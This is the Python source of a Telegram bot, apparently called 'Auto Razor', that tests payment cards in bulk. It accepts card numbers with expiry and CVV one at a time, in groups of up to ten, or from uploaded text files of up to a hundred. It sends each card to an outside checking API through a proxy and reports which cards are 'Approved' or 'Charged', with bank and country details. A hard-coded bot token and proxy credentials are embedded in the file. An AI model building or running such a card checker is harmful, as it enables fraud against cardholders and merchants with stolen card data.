import asyncio
import re
import time
import os
import httpx
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# --- BOT CONFIGURATION ---
BOT_TOKEN = "8675224758:AAEoo8qvV9C4wNnQ5cySS8Ko2tueGDI9Q4w"

# --- API CONFIG ---
API_BASE = "https://rz.rcvan.indevs.in/rz"
PROXY = "ca-mon.pvdata.host:8080:g2rTXpNfPdcw2fzGtWKp62yH:nizar1elad2"
GATE_NAME = "Auto Razor"

# --- PLACEHOLDER FUNCTIONS ---
async def get_bin_details(cc_num):
    return "VISA", "DEBIT", "PLATINUM", "BANK OF AMERICA", "United States", "🇺🇸", "USD"

async def check_all_thing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    return True, "Role: User"

async def getmessage(message_text):
    parts = message_text.split('|')
    if len(parts) == 4:
        return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    return False

async def setantispamtime(user_id): pass
async def deductcredit(user_id): pass
async def send_hit_if_approved(context, chat_id, message_text): pass
async def error_log(error_message): print(f"ERROR: {error_message}")

# --- API CALL ---
async def call_razor_api(fullcc):
    endpoint_url = f"{API_BASE}?cc={fullcc}&proxy={PROXY}"
    async with httpx.AsyncClient(timeout=60, follow_redirects=True) as session:
        for attempt in range(2):
            try:
                response_obj = await session.get(endpoint_url)
                result_json = response_obj.json()

                gate_name = result_json.get("GATE", GATE_NAME).strip()
                response_msg = result_json.get("response", "No response message").strip()

                upper_msg = response_msg.upper()
                if "LIVE" in upper_msg or "APPROVED" in upper_msg or "SUCCESS" in upper_msg or "CHARGED" in upper_msg:
                    return "Approved ✓", response_msg, gate_name
                elif "DEAD" in upper_msg or "DECLINED" in upper_msg or "FAILED" in upper_msg or "FRAUD" in upper_msg:
                    return "Declined ✗", response_msg, gate_name
                else:
                    return "Unknown", response_msg, gate_name
            except httpx.RequestError as e:
                if attempt == 1:
                    return "Error", f"Request failed: {e}", GATE_NAME
                await asyncio.sleep(1)
            except Exception as e:
                if attempt == 1:
                    return "Error", f"An unexpected error occurred: {e}", GATE_NAME
                await asyncio.sleep(1)
    return "Error", "Request failed after multiple attempts", GATE_NAME

def extract_cards(text):
    pattern = r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}"
    return re.findall(pattern, text)

# --- MASS PROCESSING ---
async def process_sequential_check(update: Update, context: ContextTypes.DEFAULT_TYPE, ccs, user_id, first_name, role):
    initial_resp = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

💠 𝙂𝙖𝙩𝙚 -» {GATE_NAME}
💠 𝘾𝘾 𝘼𝙢𝙤𝙪𝙣𝙩 -» {len(ccs)}
💠 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 -» {first_name}
💠 𝙎𝙩𝙖𝙩𝙪𝙨 -» Processing...
━━━━━━━━━━━━━━━━━━━━"""
    progress_msg = await update.message.reply_text(initial_resp, quote=True, parse_mode='HTML')
    header_text = f"""✧ <b>ꜱᴘʏᴅᴇ ━ ᴍᴀꜱꜱ ᴄʜᴇᴄᴋ</b> ✧
━━━━━━━━━━━━━━━━━━━━
"""
    final_text = header_text
    start_time = time.perf_counter()
    gateway = GATE_NAME

    for fullcc in ccs:
        status, response, gateway = await call_razor_api(fullcc)
        cc_num = fullcc.split("|")[0]
        getbin = await get_bin_details(cc_num)
        brand, type_, level, bank, country, flag, currency = getbin

        card_resp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
━━━━━━━━━━━━━━━━━━━━
"""
        final_text += card_resp
        try:
            await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode='HTML')
        except Exception as e:
            print(f"Error editing message: {e}")
        await asyncio.sleep(0.5)

    elapsed_time = round(time.perf_counter() - start_time, 2)
    footer = f"""════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {elapsed_time}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={user_id}'>{first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
    final_text += footer
    await progress_msg.edit_text(final_text, disable_web_page_preview=True, parse_mode='HTML')
    await setantispamtime(user_id)

# --- /rz SINGLE ---
async def rz_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = str(update.effective_user.id)
        first_name = update.effective_user.first_name
        ok, role = await check_all_thing(update, context)
        if not ok: return

        if not context.args:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /rz

↪ <b>ᴜꜱᴀɢᴇ :</b> /rz cc|mm|yyyy|cvv
━━━━━━━━━━━━━━━━━━━━"""
            await update.message.reply_text(resp, quote=True, parse_mode='HTML')
            return

        getcc_result = await getmessage(" ".join(context.args))
        if not getcc_result:
            await update.message.reply_text("✦ ɪɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ ✦\nUse: cc|mm|yyyy|cvv", quote=True, parse_mode='HTML')
            return

        cc, mes, ano, cvv = getcc_result
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        gateway = GATE_NAME

        firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■□□□"""
        firstchk = await update.message.reply_text(firstresp, quote=True, parse_mode='HTML')

        secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■□"""
        await asyncio.sleep(0.5)
        secondchk = await firstchk.edit_text(secondresp, parse_mode='HTML')

        start = time.perf_counter()
        status, response, gateway = await call_razor_api(fullcc)
        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin

        thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧

💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙂𝙖𝙩𝙚-» <i>{gateway}</i>
💠 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚-» ■■■■"""
        await asyncio.sleep(0.3)
        thirdcheck = await secondchk.edit_text(thirdresp, parse_mode='HTML')

        finalresp = f"""💠 𝘾𝙘-» <code>{fullcc}</code>
💠 𝙎𝙩𝙖𝙩𝙪𝙨-» {status}
💠 𝙍𝙚𝙨𝙪𝙡𝙩-» {response} 💎
════『 INFO 』════
<blockquote expandable>💠 𝘾𝙤𝙪𝙣𝙩𝙧𝙮-» {country} {flag}
💠 𝘽𝙞𝙣-» {brand}_{type_}-{level}
💠 𝘽𝙖𝙣𝙠-» {bank}</blockquote>
════『 META 』════
💠 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
💠 𝙏𝙞𝙢𝙚-» {time.perf_counter() - start:0.2f}s
💠 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮-» <a href='tg://user?id={update.effective_user.id}'>{update.effective_user.first_name}</a> ↯
{role}
════『 OWNER 』════
      <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
        await thirdcheck.edit_text(finalresp, disable_web_page_preview=True, parse_mode='HTML')
        await setantispamtime(user_id)
        await deductcredit(user_id)
        if "Approved" in status:
            await send_hit_if_approved(context, update.effective_chat.id, finalresp)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- /mrz MASS via text/reply ---
async def mrz_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = str(update.effective_user.id)
        first_name = update.effective_user.first_name
        ok, role = await check_all_thing(update, context)
        if not ok: return

        ccs = []
        if update.message.reply_to_message:
            reply_text = update.message.reply_to_message.text or update.message.reply_to_message.caption or ""
            ccs = extract_cards(reply_text)
        elif context.args:
            ccs = extract_cards(" ".join(context.args))

        MAX_MSC_LIMIT = 10
        if not ccs:
            resp = f"""✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /mrz

↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to cards or /mrz cc|mm|yyyy|cvv (up to {MAX_MSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await update.message.reply_text(resp, quote=True, parse_mode='HTML')
            return

        if len(ccs) > MAX_MSC_LIMIT:
            await update.message.reply_text(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_MSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_MSC_LIMIT]

        await process_sequential_check(update, context, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

# --- /trz MASS via .txt file ---
async def trz_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    try:
        user_id = str(update.effective_user.id)
        first_name = update.effective_user.first_name
        ok, role = await check_all_thing(update, context)
        if not ok: return

        target_message = None
        if update.message.reply_to_message and update.message.reply_to_message.document:
            target_message = update.message.reply_to_message
        elif update.message.document:
            target_message = update.message

        MAX_TSC_LIMIT = 100
        if not target_message or not target_message.document.file_name.endswith(".txt"):
            resp = f"""✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰

⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}
◈ <b>ᴄᴍᴅ :</b> /trz

↪ ᴜᴘʟᴏᴀᴅ ᴀ .ᴛxᴛ ꜰɪʟᴇ ᴏʀ ʀᴇᴘʟʏ ᴛᴏ ᴏɴᴇ (up to {MAX_TSC_LIMIT})
━━━━━━━━━━━━━━━━━━━━"""
            await update.message.reply_text(resp, quote=True, parse_mode='HTML')
            return

        file_id = target_message.document.file_id
        new_file = await context.bot.get_file(file_id)
        file_path = await new_file.download_to_drive()
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
            ccs = extract_cards(content)
        os.remove(file_path)

        if not ccs:
            await update.message.reply_text("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True)
            return
        if len(ccs) > MAX_TSC_LIMIT:
            await update.message.reply_text(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True)
            ccs = ccs[:MAX_TSC_LIMIT]

        await process_sequential_check(update, context, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("rz", rz_command))
    application.add_handler(CommandHandler("mrz", mrz_command))
    application.add_handler(CommandHandler("trz", trz_command))
    print("Bot started...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
